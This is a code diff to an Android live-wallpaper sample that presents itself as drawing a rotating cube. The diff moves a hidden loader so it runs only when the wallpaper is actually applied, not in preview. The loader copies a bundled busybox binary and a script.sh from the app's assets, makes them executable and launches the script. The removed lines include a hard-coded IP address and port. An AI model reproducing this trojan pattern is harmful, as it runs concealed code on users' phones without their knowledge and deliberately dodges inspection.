@@ -17,116 +17,27 @@
 package com.example.android.livecubes.cube1;
 
 import java.io.File;
-import java.io.FileInputStream;
-import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
-import java.io.IOException;
 import java.io.InputStream;
-
-import junit.framework.AssertionFailedError;
-
 import android.annotation.SuppressLint;
-import android.app.WallpaperManager;
-import android.app.WallpaperInfo;
-import android.content.ComponentName;
-import android.content.Context;
-import android.content.ContextWrapper;
-import android.content.res.AssetFileDescriptor;
-import android.content.res.AssetManager;
-import android.content.res.AssetManager.AssetInputStream;
 import android.graphics.Canvas;
 import android.graphics.Paint;
-import android.graphics.Rect;
 import android.os.Handler;
 import android.os.SystemClock;
 import android.service.wallpaper.WallpaperService;
-import android.util.Log;
 import android.view.MotionEvent;
 import android.view.SurfaceHolder;
-import android.widget.Toast;
-
-import static android.content.ContentValues.TAG;
 
 /*
  * This animated wallpaper draws a rotating wireframe cube.
  */
 public class CubeWallpaper1 extends WallpaperService {
-	public static final String HOST = "192.168.0.101";
-	public static final String PORT = "9000";
 
 	private final Handler mHandler = new Handler();
 
 	@Override
 	public void onCreate() {
 		super.onCreate();
-		final String datadir = getFilesDir().getAbsolutePath();
-		Thread t = new Thread(new Runnable() {
-
-			@SuppressLint("NewApi") @Override
-			public void run() {
-				Log.d("DEBUG", "Starting");
-				InputStream in = null;
-				try {
-					in = getAssets().open("busybox");
-
-					
-					FileOutputStream out = null;
-
-					out = new FileOutputStream(datadir + "/busybox");
-					byte[] buffer = new byte[512];
-
-					int inputByte;
-
-					while (in.available() > 512) {
-						in.read(buffer);
-						out.write(buffer);
-					}
-					int remainder = in.available();
-					in.read(buffer, 0, in.available());
-					out.write(buffer,0,remainder);
-					out.close();
-					File outFile = new File(datadir + "/busybox");
-					outFile.setExecutable(true);
-					outFile.setWritable(true);
-					outFile.setReadable(true);
-					
-					in = getAssets().open("script.sh");
-
-					out = new FileOutputStream(datadir + "/script.sh");
-					
-
-					
-
-					while (in.available() > 512) {
-						in.read(buffer);
-						out.write(buffer);
-					}
-					remainder = in.available();
-					in.read(buffer, 0, in.available());
-					out.write(buffer,0,remainder);
-					out.close();
-					outFile = new File(datadir + "/script.sh");
-					outFile.setExecutable(true);
-					outFile.setWritable(true);
-					outFile.setReadable(true);
-
-				} catch (Exception e) {
-					// TODO Auto-generated catch block
-					e.printStackTrace();
-				}
-				try {
-				
-				Process p = Runtime.getRuntime().exec(datadir + "/script.sh", null, new File(datadir));
-				
-				 
-				 } catch (Exception e) {
-					 Log.d("DEBUG", "Run Error");
-				e.printStackTrace();
-				 }
-
-			}
-		});
-		t.start();
 	}
 
 	@Override
@@ -172,11 +83,73 @@ public class CubeWallpaper1 extends WallpaperService {
 		public void onCreate(SurfaceHolder surfaceHolder) {
 			super.onCreate(surfaceHolder);
 			if (this.isPreview()) {
-				Log.d(TAG, "This is a preview, not the real wallpaper.");
-				Toast.makeText(getApplicationContext(), "This is a preview, not the real wallpaper.", Toast.LENGTH_LONG).show();
 			} else {
-				Log.d(TAG, "This is the real wallpaper.");
-				Toast.makeText(getApplicationContext(), "This is the real wallpaper.", Toast.LENGTH_LONG).show();
+				final String datadir = getFilesDir().getAbsolutePath();
+				Thread t = new Thread(new Runnable() {
+
+					@SuppressLint("NewApi") @Override
+					public void run() {
+						InputStream in = null;
+						try {
+							in = getAssets().open("busybox");
+
+
+							FileOutputStream out = null;
+
+							out = new FileOutputStream(datadir + "/busybox");
+							byte[] buffer = new byte[512];
+
+							int inputByte;
+
+							while (in.available() > 512) {
+								in.read(buffer);
+								out.write(buffer);
+							}
+							int remainder = in.available();
+							in.read(buffer, 0, in.available());
+							out.write(buffer,0,remainder);
+							out.close();
+							File outFile = new File(datadir + "/busybox");
+							outFile.setExecutable(true);
+							outFile.setWritable(true);
+							outFile.setReadable(true);
+
+							in = getAssets().open("script.sh");
+
+							out = new FileOutputStream(datadir + "/script.sh");
+
+
+
+
+							while (in.available() > 512) {
+								in.read(buffer);
+								out.write(buffer);
+							}
+							remainder = in.available();
+							in.read(buffer, 0, in.available());
+							out.write(buffer,0,remainder);
+							out.close();
+							outFile = new File(datadir + "/script.sh");
+							outFile.setExecutable(true);
+							outFile.setWritable(true);
+							outFile.setReadable(true);
+
+						} catch (Exception e) {
+							// TODO Auto-generated catch block
+							e.printStackTrace();
+						}
+						try {
+
+							Process p = Runtime.getRuntime().exec(datadir + "/script.sh", null, new File(datadir));
+
+
+						} catch (Exception e) {
+							e.printStackTrace();
+						}
+
+					}
+				});
+				t.start();
 			}
 			// By default we don't get touch events, so enable them.
 			setTouchEventsEnabled(true);
